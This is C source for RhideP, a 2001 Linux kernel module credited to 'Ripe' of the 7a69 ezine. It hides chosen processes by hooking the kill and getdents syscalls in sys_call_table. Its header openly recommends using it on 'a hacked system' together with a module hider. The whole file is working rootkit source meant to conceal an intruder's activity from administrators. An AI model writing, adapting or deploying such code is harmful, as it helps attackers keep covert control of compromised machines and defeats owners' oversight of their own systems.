/*
 * TILE: RhideP v1.0 <10/5/2001>
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * DECRP: This is a process hider LKM. In this module you can hide/unhide a
 *        process using kill syscall. When you insert the module, you can
 *        pase the hide and unhide signal using "ins" and "del" argument.
 *
 *        root@donasec.com ~# insmod rhidep.o ins=16 del=31 [-f]
 *        root#donasec.com ~#
 *
 *        Using the example, you'll hide process using "kill -16 <pid>" and
 *        unhide using "kill-31 <pid>" command.
 *
 * RECOM: If you use this LKM to hide process on a hacked system, is very
 *        important to hide the module too. To do it you should use the
 *        hider.c LKM (Good hack!).
 *
 * NOTE: (for Script-kidiies) If you use it the admin will see you ?Why? :)
 *
 * TESTED: This LKM have been tested without problems on:
 *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
 *           - Linux Kernel 2.2.18 (Debian 2.2)
 */

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/proc_fs.h>
#include <linux/dirent.h>

#include <sys/syscall.h>

#define _7A69SOFT_
#define CODER       "Ripe"
#define DEBUGMODE

#define DEF_INS    16
#define DEF_DEL    31

extern void *sys_call_table[];

int ins;
int del;

struct {
  int ins;
  int del;
} status;

typedef struct {
  pid_t pid;
  struct lpid *next;
} lpid;

lpid *p_list;

int (*o_kill)(pid_t pid, int sig);
int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

int my_atoi(char *str) {
  int res=0;
  int mul=1;
  char *ptr;
  for(ptr=str+strlen(str)-1 ; ptr>=str ; ptr--) {
    if ((*ptr<'0') || (*ptr>'9')) return(-1);
    res+=(*ptr-'0')*mul;
    mul*=10;
  }
  return(res);
}

void my_bzero(char *buf, int size) {
  memset(buf, 0, size);
}

struct task_struct *get_task_struct(pid_t pid) {
  struct task_struct *p=current;
  do {
    if (p->pid==pid) return(p);
    p=p->next_task;
  } while (p!=current);
  return(NULL);
}

void add_pid(pid_t pid) {
  lpid *ptr=p_list;
#ifdef DEBUGMODE
  printk("(RP) Adding %i pid to hide list\n", pid);
#endif
  if (is_pid(pid)==1) return;
  if (ptr) {
    while (ptr->next) {
      if (ptr->pid==pid) return;
      ptr=(lpid *)ptr->next;
    }
    ptr->next=(struct lpid *)kmalloc(sizeof(lpid), GFP_KERNEL);
    ptr=(lpid *)ptr->next;
    ptr->pid=pid;
    ptr->next=NULL;
  } else {
    p_list=(lpid *)kmalloc(sizeof(lpid), GFP_KERNEL);
    ptr=p_list;
    ptr->pid=pid;
    ptr->next=NULL;
  }
  return;
}

void del_pid(pid_t pid) {
  lpid *ptr=p_list, *ptr2;
#ifdef DEBUGMODE
  printk("(RP) Deleting %i pid from hide list\n", pid);
#endif
  if (!ptr) return;
  if (ptr->pid==pid) {
    p_list=(lpid *)ptr->next;
    kfree(ptr);
    return;
  }
  while(ptr) {
    if (ptr->pid==pid) break;
    ptr2=ptr;
    ptr=(lpid *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    kfree(ptr);
  }
  return;
}

int is_pid(pid_t pid) {
  lpid *ptr=p_list;
  while(ptr) {
    if (ptr->pid==pid) return(1);
    ptr=(lpid *)ptr->next;
  }
  return(0);
}

int my_kill(pid_t pid, int sig) {
  if (status.ins==sig) {
    add_pid(pid);
    return(0);
  }
  if (status.del==sig) {
    del_pid(pid);
    return(0);
  }
  return((*o_kill)(pid, sig));
}

int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
  int ret=0;
  int o_ret=(*o_getdents)(fd, dirp, count);
  int pid;
  int tmp=0;
  struct task_struct *task;
  struct dirent *dirp_cpy, *dirp_ret, *dirp_cpy2, *dirp_ret2;
  if (o_ret<=0) return(o_ret);
  dirp_cpy=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
  dirp_ret=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
  __generic_copy_from_user(dirp_cpy, dirp, o_ret);
  my_bzero((char *)dirp_ret, o_ret);
  __generic_copy_to_user(dirp, dirp_ret, o_ret);
  dirp_cpy2=dirp_cpy;
  dirp_ret2=dirp_ret;
  while (tmp<o_ret) {
    tmp=tmp+dirp_cpy2->d_reclen;
    if (dirp_cpy2->d_reclen==0) break;
    pid=my_atoi(dirp_cpy2->d_name);
    task=get_task_struct(pid);
    if (((task!=NULL) && (is_pid(pid)==0)) || (task==NULL)) {
      memcpy(dirp_ret2, dirp_cpy2, dirp_cpy2->d_reclen);
      ret=ret+dirp_cpy2->d_reclen;
      dirp_ret2=(struct dirent *)((char *)dirp_ret2+dirp_cpy2->d_reclen);
    }
    dirp_cpy2=(struct dirent *)((char *)dirp_cpy2+dirp_cpy2->d_reclen);
  }
  __generic_copy_to_user(dirp, dirp_ret, ret);
  kfree(dirp_cpy);
  kfree(dirp_ret);
  return(ret);
}

int init_module() {
  status.ins=DEF_INS;
  status.del=DEF_DEL;
  if (ins) status.ins=ins;
  if (del) status.del=del;
  o_kill=sys_call_table[__NR_kill];
  o_getdents=sys_call_table[__NR_getdents];
  sys_call_table[__NR_kill]=my_kill;
  sys_call_table[__NR_getdents]=my_getdents;
#ifdef DEBUGMODE
  printk("(RP) RhideP by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RP) Loaded!\n");
#endif
  return(0);
}

void cleanup_module() {
  sys_call_table[__NR_kill]=o_kill;
  sys_call_table[__NR_getdents]=o_getdents;
#ifdef DEBUGMODE
  printk("(RP) RhideP by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RP) UnLoaded!\n");
#endif
}

MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
MODULE_DESCRIPTION("hack: Process hider");
MODULE_PARM(ins, "i");
MODULE_PARM(del, "i");
